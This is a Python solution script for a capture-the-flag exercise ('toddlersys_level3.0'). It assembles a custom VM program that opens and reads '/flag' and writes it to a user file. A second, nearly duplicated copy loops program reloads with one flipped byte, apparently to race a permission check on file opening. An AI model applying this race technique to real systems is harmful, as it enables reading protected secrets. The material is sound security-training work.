
def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="cfdsbai"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x02"
    elif arg == "read_memory":
        return b"\x01"
    elif arg == "write":
        return b"\x20"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x10"
    elif(ass[0] == "ADD"):
        op = b"\x04"
    elif(ass[0] == "STK"):
        op = b"\x01"
    elif(ass[0] == "STM"):
        op = b"\x08"
    elif(ass[0] == "LDM"):
        op = b"\x40"
    elif(ass[0] == "CMP"):
        op = b"\x20"
    elif(ass[0] == "JMP"):
        op = b"\x02"
    elif(ass[0] == "SYS"):
        op = b"\x80"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc = bc + bytearray(c)

    bc.insert(2, op[0])
    return bc

c = bytearray()
yangasm = '''
IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x66
IMM c = 0x81
STM *c = d

IMM d = 0x6c
IMM c = 0x82
STM *c = d

IMM d = 0x61
IMM c = 0x83
STM *c = d

IMM d = 0x67
IMM c = 0x84
STM *c = d

IMM d = 0x0
IMM c = 0x85
STM *c = d

IMM a = 0x80
IMM b = 0x40
IMM c = 0xff
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS read_memory a

IMM b = 0x39
CMP a b



IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x68
IMM c = 0x81
STM *c = d

IMM d = 0x6f
IMM c = 0x82
STM *c = d

IMM d = 0x6d
IMM c = 0x83
STM *c = d

IMM d = 0x65
IMM c = 0x84
STM *c = d

IMM d = 0x2f
IMM c = 0x85
STM *c = d

IMM d = 0x68
IMM c = 0x86
STM *c = d

IMM d = 0x61
IMM c = 0x87
STM *c = d

IMM d = 0x63
IMM c = 0x88
STM *c = d

IMM d = 0x6b
IMM c = 0x89
STM *c = d

IMM d = 0x65
IMM c = 0x8a
STM *c = d

IMM d = 0x72
IMM c = 0x8b
STM *c = d

IMM d = 0x2f
IMM c = 0x8c
STM *c = d

IMM d = 0x62
IMM c = 0x8d
STM *c = d

IMM d = 0x0
IMM c = 0x8e
STM *c = d

IMM a = 0x80
IMM b = 0x02
IMM c = 0x00
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS write a
'''

yangasm = yangasm.split("\n")
for i in yangasm:
    c += assembly(i)

from pwn import *
# display the bytes
# print(disasm(my_sc))
context.arch="amd64"
context.os = "linux"




p = process("/challenge/toddlersys_level3.0")
nc1 = connect("localhost", 1337)
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlersys_level2.0", gdbscript="source /opt/gef/gef.py")
def load_program(n:connect, i:int, c:bytearray):
    n.sendline("load_program")
    n.sendline(str(i))
    n.send(c)
def init_ypu(n:connect, i:int):
    n.sendline("init_ypu")
    n.sendline(str(i))
def run_ypu(n:connect, i:int):
    n.sendline("run_ypu")
    n.sendline(str(i))

load_program(nc1, 1, c)
init_ypu(nc1, 1)
while True:
    run_ypu(nc1, 1)




def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="cfdsbai"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x02"
    elif arg == "read_memory":
        return b"\x01"
    elif arg == "write":
        return b"\x20"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x10"
    elif(ass[0] == "ADD"):
        op = b"\x04"
    elif(ass[0] == "STK"):
        op = b"\x01"
    elif(ass[0] == "STM"):
        op = b"\x08"
    elif(ass[0] == "LDM"):
        op = b"\x40"
    elif(ass[0] == "CMP"):
        op = b"\x20"
    elif(ass[0] == "JMP"):
        op = b"\x02"
    elif(ass[0] == "SYS"):
        op = b"\x80"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc = bc + bytearray(c)

    bc.insert(2, op[0])
    return bc

c = bytearray()
yangasm = '''
IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x66
IMM c = 0x81
STM *c = d

IMM d = 0x6c
IMM c = 0x82
STM *c = d

IMM d = 0x61
IMM c = 0x83
STM *c = d

IMM d = 0x67
IMM c = 0x84
STM *c = d

IMM d = 0x0
IMM c = 0x85
STM *c = d

IMM a = 0x80
IMM b = 0x40
IMM c = 0xff
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS read_memory a

IMM b = 0x39
CMP a b



IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x68
IMM c = 0x81
STM *c = d

IMM d = 0x6f
IMM c = 0x82
STM *c = d

IMM d = 0x6d
IMM c = 0x83
STM *c = d

IMM d = 0x65
IMM c = 0x84
STM *c = d

IMM d = 0x2f
IMM c = 0x85
STM *c = d

IMM d = 0x68
IMM c = 0x86
STM *c = d

IMM d = 0x61
IMM c = 0x87
STM *c = d

IMM d = 0x63
IMM c = 0x88
STM *c = d

IMM d = 0x6b
IMM c = 0x89
STM *c = d

IMM d = 0x65
IMM c = 0x8a
STM *c = d

IMM d = 0x72
IMM c = 0x8b
STM *c = d

IMM d = 0x2f
IMM c = 0x8c
STM *c = d

IMM d = 0x62
IMM c = 0x8d
STM *c = d

IMM d = 0x0
IMM c = 0x8e
STM *c = d

IMM a = 0x80
IMM b = 0x02
IMM c = 0x00
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS write a
'''

yangasm = yangasm.split("\n")
for i in yangasm:
    c += assembly(i)

from pwn import *
# display the bytes
# print(disasm(my_sc))
context.arch="amd64"
context.os = "linux"




# p = process("/challenge/toddlersys_level3.0")
nc1 = connect("localhost", 1337)
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlersys_level2.0", gdbscript="source /opt/gef/gef.py")
def load_program(n:connect, i:int, c:bytearray):
    n.sendline("load_program")
    n.sendline(str(i))
    n.send(c)
def init_ypu(n:connect, i:int):
    n.sendline("init_ypu")
    n.sendline(str(i))
def run_ypu(n:connect, i:int):
    n.sendline("run_ypu")
    n.sendline(str(i))


cc = bytearray(c)
cc[0x4a] = b"\x02"[0]
while True:
    load_program(nc1, 1, cc)
    init_ypu(nc1, 1)
    load_program(nc1, 1, c)
    init_ypu(nc1, 1)

#写个脚本循环读取./b的内容
